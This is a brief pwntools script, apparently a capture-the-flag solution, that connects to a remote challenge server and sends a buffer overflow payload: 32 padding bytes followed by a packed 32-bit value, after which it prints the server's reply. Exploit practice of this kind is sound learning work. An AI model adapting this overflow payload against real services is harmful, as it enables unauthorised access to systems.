from pwn import *
#elf = context.binary = ELF('./file')
#p = process()
p = remote("codefest-ctf.iitbhu.tech",56921)
offset = 32
payload = b"A" * offset + p32(0x23456723)
p.sendline(payload)
write("payload",payload)
print(p.recvall())
